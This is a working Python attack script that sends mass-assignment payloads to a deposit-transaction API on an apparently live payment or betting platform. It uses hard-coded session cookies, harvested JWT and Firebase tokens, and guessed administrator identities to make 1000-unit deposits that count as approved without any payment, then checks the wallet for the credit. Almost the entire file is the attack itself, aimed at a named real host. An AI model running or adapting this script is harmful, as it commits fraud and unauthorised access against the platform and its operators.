#!/usr/bin/env python3
"""probe_dep_inject.py — Mass assignment injection into deposit-transaction.

   WORKING: POST /mb/deposit-transaction returns HTTP 200 with AWSALB.
   ATTACK: Inject approved_by + approve_status + status in creation payload.
   If the Go handler doesn't whitelist fields, the deposit is created as approved.

   Also try: "approved_by": "vak88" (user hint), "Vak88z", "vak88admin".
"""
import json, pathlib, requests, uuid, time, base64

TID   = "af6efb584a3d317b5a11ab6209b88e1b"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

JWT = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()
_new = pathlib.Path("/home/kzp/claude-red/fb_id_token_new.txt")
FB_TOKEN = (_new.read_text().strip() if _new.exists() and _new.stat().st_size > 100
            else pathlib.Path("/home/kzp/claude-red/fb_id_token.txt").read_text().strip())
parts = FB_TOKEN.split(".")
pad = parts[1] + "=" * (-len(parts[1]) % 4)
FB_UID = json.loads(base64.urlsafe_b64decode(pad)).get("sub", "")

HDR = {"Authorization": f"Bearer {JWT}", "template": "vn", "Content-Type": "application/json",
       "Cookie": f"AWSALB={AWSALB}"}
BANK_INFO = "18a9502b-94ae-4188-8841-094be8b3b974"
DEP_ACCT  = "00b6996c-0e41-4b56-9fa7-94f77f4fd717"
TS_MS     = int(time.time() * 1000)

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    return r.json().get("balance", "?") if r.ok else f"ERR:{r.status_code}"

AMOUNT = 1000.0

print(f"wallet before: {wallet()}")

# ── Mass assignment injection variants ───────────────────────────────────────
approved_by_variants = [
    "vak88",
    "Vak88z",
    "vak88admin",
    "admin",
    "Autodaily",
    "checksystem",
    "5958356c-eb4e-4e07-a155-83e4382e3532",  # admin UUID
    "8155e2a2-77f1-47a1-8242-581be5e00550",  # vak88admin UUID
    FB_UID,                                   # player Firebase UID (self-approval)
    "eea830ab-b187-4f21-9b79-28e2773b2f6b",  # platform user_id (sub from JWT)
]

for approved_by in approved_by_variants:
    slip = f"{uuid.uuid4()}.jfif"
    base = {
        "deposit_amount":              AMOUNT,
        "slip_image_url":              slip,
        "is_auto_slip":                True,
        "payment_bank_information_id": BANK_INFO,
        "deposit_account_id":          DEP_ACCT,
    }
    # Inject approval fields
    injected = {
        **base,
        "approved_by":    approved_by,
        "approve_status": "success",
        "status":         "success",
        "credited":       True,
        "balance_after_success": AMOUNT + 0.31,
    }
    r = requests.post(f"{MGAPI}/mb/deposit-transaction",
                      headers=HDR, json=injected, timeout=12)
    if r.ok:
        d = r.json()
        dep_id = d.get("id", "?")
        status = d.get("approve_status", d.get("status", "?"))
        bal_after = d.get("balance_after_success", d.get("balance_after_deposit", "?"))
        print(f"\n  approved_by={approved_by}:")
        print(f"    HTTP 200  id={dep_id[:8]}  approve_status={status}  bal_after={bal_after}")
        if status in ("success", "approved"):
            print(f"    [!!!] CREDITED! check wallet")
            time.sleep(1)
            print(f"    wallet: {wallet()}")
    else:
        print(f"  approved_by={approved_by}: HTTP {r.status_code}")

# ── Try status=success without approved_by ────────────────────────────────────
print("\n--- status injection without approved_by ---")
for status_val in ["success", "approved", "complete"]:
    slip = f"{uuid.uuid4()}.jfif"
    r = requests.post(f"{MGAPI}/mb/deposit-transaction",
                      headers=HDR,
                      json={**{
                          "deposit_amount": AMOUNT, "slip_image_url": slip,
                          "is_auto_slip": True,
                          "payment_bank_information_id": BANK_INFO,
                          "deposit_account_id": DEP_ACCT,
                      }, "status": status_val, "approve_status": status_val},
                      timeout=12)
    d = r.json() if r.ok else {}
    print(f"  status={status_val}: HTTP {r.status_code}  "
          f"approve_status={d.get('approve_status','?')}  "
          f"bal_after={d.get('balance_after_success', d.get('balance_after_deposit','?'))}")

# ── Check wallet after all injections ─────────────────────────────────────────
time.sleep(3)
bal_final = wallet()
print(f"\nwallet after: {bal_final}")

# ── List pending deposits ─────────────────────────────────────────────────────
print("\n=== GET /mb/deposit-transaction (no params) ===")
r = requests.get(f"{MGAPI}/mb/deposit-transaction", headers=HDR, timeout=10)
print(f"  HTTP {r.status_code}: {r.text[:400]}")

print("\n=== DONE ===")
